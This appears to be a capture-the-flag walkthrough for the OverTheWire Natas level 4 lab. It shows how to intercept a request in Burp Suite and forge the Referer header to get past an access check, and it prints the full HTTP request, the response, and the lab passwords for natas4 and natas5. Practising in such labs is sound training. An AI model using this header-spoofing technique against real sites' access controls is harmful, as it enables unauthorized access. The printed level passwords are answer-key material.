@@ -1,0 +1,75 @@
+Password: tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
+
+Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
+
+Login to BURP SUITE
+
+Toggle: Intercept is On
+
+Confirm that Web-Browser FOXYPROXY is set to 127.0.0.1 Port: 8080
+
+Refresh Page in Web-Browser
+
+In Burp Suite FORWARD the INTERCEPT
+
+Web-Browser: Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" 
+
+Burp Suite: HTTP History - right click "http://natas4.natas.labs.overthewire.org/" Send to Repeater
+GET /index.php HTTP/1.1
+
+Host: natas4.natas.labs.overthewire.org
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Authorization: Basic bmF0YXM0OnRLT2NKSWJ6TTRsVHM4aGJDbXpuNVpyNDQzNGZHWlFt
+
+Connection: close
+
+Referer: http://natas4.natas.labs.overthewire.org/  <-----CHANGE TO: http://natas5.natas.labs.overthewire.org/ 
+
+Upgrade-Insecure-Requests: 1
+
+*PRESS SEND*
+
+HTTP/1.1 200 OK
+
+Date: Fri, 24 May 2024 08:27:06 GMT
+
+Server: Apache/2.4.52 (Ubuntu)
+
+Vary: Accept-Encoding
+
+Content-Length: 962
+
+Connection: close
+
+Content-Type: text/html; charset=UTF-8
+
+
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas4", "pass": "tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm" };</script></head>
+<body>
+<h1>natas4</h1>
+<div id="content">
+
+Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
+<br/>
+<div id="viewsource"><a href="index.php">Refresh page</a></div>
+</div>
+</body>
+</html>
